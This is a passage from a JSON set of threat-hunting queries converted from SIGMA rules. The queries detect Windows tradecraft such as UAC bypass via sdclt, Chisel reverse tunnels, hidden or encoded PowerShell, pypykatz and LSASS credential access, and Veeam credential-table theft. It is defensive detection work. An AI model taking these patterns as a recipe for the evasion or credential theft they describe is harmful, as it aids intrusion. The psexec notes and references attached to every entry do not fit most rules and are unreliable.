            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 147
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Executes SCT script using scrobj.dll from a command in entered into a specially prepared INF file.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "InfDefaultInstall.exe .inf Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"InfDefaultInstall.exe \" and tgt.process.cmdline contains \".inf\")) | columns ComputerName,tgt.process.user,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 148
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "A General detection for sdclt being spawned as an elevated process. This could be an indicator of sdclt being used for bypass UAC techniques.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "Potential UAC Bypass Via Sdclt.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"sdclt.exe\" and (tgt.process.integrityLevel in (\"High\",\"S-1-16-12288\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 149
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the Chisel tunneling tool via the commandline arguments",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1090"
            ],
            "name": "PUA - Chisel Tunneling Tool Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\chisel.exe\" or ((tgt.process.cmdline contains \"exe client \" or tgt.process.cmdline contains \"exe server \") and (tgt.process.cmdline contains \"-socks5\" or tgt.process.cmdline contains \"-reverse\" or tgt.process.cmdline contains \" r:\" or tgt.process.cmdline contains \":127.0.0.1:\" or tgt.process.cmdline contains \"-tls-skip-verify \" or tgt.process.cmdline contains \":socks\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 150
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects encoded base64 MZ header in the commandline",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "Base64 MZ Header In CommandLine",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"TVqQAAMAAAAEAAAA\" or tgt.process.cmdline contains \"TVpQAAIAAAAEAA8A\" or tgt.process.cmdline contains \"TVqAAAEAAAAEABAA\" or tgt.process.cmdline contains \"TVoAAAAAAAAAAAAA\" or tgt.process.cmdline contains \"TVpTAQEAAAAEAAAA\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 151
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential DLL injection and execution using \"Tracker.exe\"",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055"
            ],
            "name": "Potential DLL Injection Or Execution Using Tracker.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\tracker.exe\" or tgt.process.displayName=\"Tracker\") and (tgt.process.cmdline contains \" /d \" or tgt.process.cmdline contains \" /c \")) and (not (tgt.process.cmdline contains \" /ERRORREPORT:PROMPT \" or (src.process.image.path contains \"\\Msbuild\\Current\\Bin\\MSBuild.exe\" or src.process.image.path contains \"\\Msbuild\\Current\\Bin\\amd64\\MSBuild.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 152
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "In Kaspersky's 2020 Incident Response Analyst Report they listed legitimate tool \"Mouse Lock\" as being used for both credential access and collection in security incidents.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1056"
            ],
            "name": "PUA - Mouse Lock Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.displayName contains \"Mouse Lock\" or tgt.process.publisher contains \"Misc314\" or tgt.process.cmdline contains \"Mouse Lock_\")) | columns tgt.process.displayName,tgt.process.publisher,tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 153
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious PowerShell invocation with a parameter substring",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious PowerShell Parameter Substring",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\") and (tgt.process.cmdline contains \" -windowstyle h \" or tgt.process.cmdline contains \" -windowstyl h\" or tgt.process.cmdline contains \" -windowsty h\" or tgt.process.cmdline contains \" -windowst h\" or tgt.process.cmdline contains \" -windows h\" or tgt.process.cmdline contains \" -windo h\" or tgt.process.cmdline contains \" -wind h\" or tgt.process.cmdline contains \" -win h\" or tgt.process.cmdline contains \" -wi h\" or tgt.process.cmdline contains \" -win h \" or tgt.process.cmdline contains \" -win hi \" or tgt.process.cmdline contains \" -win hid \" or tgt.process.cmdline contains \" -win hidd \" or tgt.process.cmdline contains \" -win hidde \" or tgt.process.cmdline contains \" -NoPr \" or tgt.process.cmdline contains \" -NoPro \" or tgt.process.cmdline contains \" -NoProf \" or tgt.process.cmdline contains \" -NoProfi \" or tgt.process.cmdline contains \" -NoProfil \" or tgt.process.cmdline contains \" -nonin \" or tgt.process.cmdline contains \" -nonint \" or tgt.process.cmdline contains \" -noninte \" or tgt.process.cmdline contains \" -noninter \" or tgt.process.cmdline contains \" -nonintera \" or tgt.process.cmdline contains \" -noninterac \" or tgt.process.cmdline contains \" -noninteract \" or tgt.process.cmdline contains \" -noninteracti \" or tgt.process.cmdline contains \" -noninteractiv \" or tgt.process.cmdline contains \" -ec \" or tgt.process.cmdline contains \" -encodedComman \" or tgt.process.cmdline contains \" -encodedComma \" or tgt.process.cmdline contains \" -encodedComm \" or tgt.process.cmdline contains \" -encodedCom \" or tgt.process.cmdline contains \" -encodedCo \" or tgt.process.cmdline contains \" -encodedC \" or tgt.process.cmdline contains \" -encoded \" or tgt.process.cmdline contains \" -encode \" or tgt.process.cmdline contains \" -encod \" or tgt.process.cmdline contains \" -enco \" or tgt.process.cmdline contains \" -en \" or tgt.process.cmdline contains \" -executionpolic \" or tgt.process.cmdline contains \" -executionpoli \" or tgt.process.cmdline contains \" -executionpol \" or tgt.process.cmdline contains \" -executionpo \" or tgt.process.cmdline contains \" -executionp \" or tgt.process.cmdline contains \" -execution bypass\" or tgt.process.cmdline contains \" -executio bypass\" or tgt.process.cmdline contains \" -executi bypass\" or tgt.process.cmdline contains \" -execut bypass\" or tgt.process.cmdline contains \" -execu bypass\" or tgt.process.cmdline contains \" -exec bypass\" or tgt.process.cmdline contains \" -exe bypass\" or tgt.process.cmdline contains \" -ex bypass\" or tgt.process.cmdline contains \" -ep bypass\" or tgt.process.cmdline contains \" /windowstyle h \" or tgt.process.cmdline contains \" /windowstyl h\" or tgt.process.cmdline contains \" /windowsty h\" or tgt.process.cmdline contains \" /windowst h\" or tgt.process.cmdline contains \" /windows h\" or tgt.process.cmdline contains \" /windo h\" or tgt.process.cmdline contains \" /wind h\" or tgt.process.cmdline contains \" /win h\" or tgt.process.cmdline contains \" /wi h\" or tgt.process.cmdline contains \" /win h \" or tgt.process.cmdline contains \" /win hi \" or tgt.process.cmdline contains \" /win hid \" or tgt.process.cmdline contains \" /win hidd \" or tgt.process.cmdline contains \" /win hidde \" or tgt.process.cmdline contains \" /NoPr \" or tgt.process.cmdline contains \" /NoPro \" or tgt.process.cmdline contains \" /NoProf \" or tgt.process.cmdline contains \" /NoProfi \" or tgt.process.cmdline contains \" /NoProfil \" or tgt.process.cmdline contains \" /nonin \" or tgt.process.cmdline contains \" /nonint \" or tgt.process.cmdline contains \" /noninte \" or tgt.process.cmdline contains \" /noninter \" or tgt.process.cmdline contains \" /nonintera \" or tgt.process.cmdline contains \" /noninterac \" or tgt.process.cmdline contains \" /noninteract \" or tgt.process.cmdline contains \" /noninteracti \" or tgt.process.cmdline contains \" /noninteractiv \" or tgt.process.cmdline contains \" /ec \" or tgt.process.cmdline contains \" /encodedComman \" or tgt.process.cmdline contains \" /encodedComma \" or tgt.process.cmdline contains \" /encodedComm \" or tgt.process.cmdline contains \" /encodedCom \" or tgt.process.cmdline contains \" /encodedCo \" or tgt.process.cmdline contains \" /encodedC \" or tgt.process.cmdline contains \" /encoded \" or tgt.process.cmdline contains \" /encode \" or tgt.process.cmdline contains \" /encod \" or tgt.process.cmdline contains \" /enco \" or tgt.process.cmdline contains \" /en \" or tgt.process.cmdline contains \" /executionpolic \" or tgt.process.cmdline contains \" /executionpoli \" or tgt.process.cmdline contains \" /executionpol \" or tgt.process.cmdline contains \" /executionpo \" or tgt.process.cmdline contains \" /executionp \" or tgt.process.cmdline contains \" /execution bypass\" or tgt.process.cmdline contains \" /executio bypass\" or tgt.process.cmdline contains \" /executi bypass\" or tgt.process.cmdline contains \" /execut bypass\" or tgt.process.cmdline contains \" /execu bypass\" or tgt.process.cmdline contains \" /exec bypass\" or tgt.process.cmdline contains \" /exe bypass\" or tgt.process.cmdline contains \" /ex bypass\" or tgt.process.cmdline contains \" /ep bypass\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 154
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potentially suspicious SQL queries using SQLCmd targeting the Veeam backup databases in order to steal information.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1005"
            ],
            "name": "Veeam Backup Database Suspicious Query",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\sqlcmd.exe\" and (tgt.process.cmdline contains \"VeeamBackup\" and tgt.process.cmdline contains \"From \")) and (tgt.process.cmdline contains \"BackupRepositories\" or tgt.process.cmdline contains \"Backups\" or tgt.process.cmdline contains \"Credentials\" or tgt.process.cmdline contains \"HostCreds\" or tgt.process.cmdline contains \"SmbFileShares\" or tgt.process.cmdline contains \"Ssh_creds\" or tgt.process.cmdline contains \"VSphereInfo\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 155
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects execution of powershell scripts via Runscripthelper.exe",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1202"
            ],
            "name": "Suspicious Runscripthelper.exe",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\Runscripthelper.exe\" and tgt.process.cmdline contains \"surfacecheck\")) | columns tgt.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 156
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "The .SettingContent-ms file type was introduced in Windows 10 and allows a user to create \"shortcuts\" to various Windows 10 setting pages. These files are simply XML and contain paths to various Windows 10 settings binaries.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1204",
                "t1566"
            ],
            "name": "Arbitrary Shell Command Execution Via Settingcontent-Ms",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \".SettingContent-ms\" and (not tgt.process.cmdline contains \"immersivecontrolpanel\"))) | columns ParentProcess,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 157
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "There is an option for a MS VS Just-In-Time Debugger \"vsjitdebugger.exe\" to launch specified executable and attach a debugger.\nThis option may be used adversaries to execute malicious code by signed verified binary.\nThe debugger is installed alongside with Microsoft Visual Studio package.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Malicious PE Execution by Microsoft Visual Studio Debugger",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\vsjitdebugger.exe\" and (not (tgt.process.image.path=\"*\\vsimmersiveactivatehelper*.exe\" or tgt.process.image.path contains \"\\devenv.exe\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 158
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of \"pypykatz\" to obtain stored credentials. Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database through Windows registry where the SAM database is stored",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1003"
            ],
            "name": "HackTool - Pypykatz Credentials Dumping Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\pypykatz.exe\" or tgt.process.image.path contains \"\\python.exe\") and (tgt.process.cmdline contains \"live\" and tgt.process.cmdline contains \"registry\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 159
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of Gpg4win to decrypt files",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "File Decryption Using Gpg4win",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\gpg.exe\" or tgt.process.image.path contains \"\\gpg2.exe\") or tgt.process.displayName=\"GnuPG\u2019s OpenPGP tool\") and (tgt.process.cmdline contains \" -d \" and tgt.process.cmdline contains \"passphrase\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 160
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of \"rar\" to add files to an archive for potential compression. An adversary may compress data (e.g. sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1560"
            ],
            "name": "Files Added To An Archive Using Rar.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\rar.exe\" and tgt.process.cmdline contains \" a \"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 161
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects a \"Get-Process\" cmdlet and it's aliases on lsass process, which is in almost all cases a sign of malicious activity",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1552"
            ],
            "name": "PowerShell Get-Process LSASS",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"Get-Process lsas\" or tgt.process.cmdline contains \"ps lsas\" or tgt.process.cmdline contains \"gps lsas\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 162
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
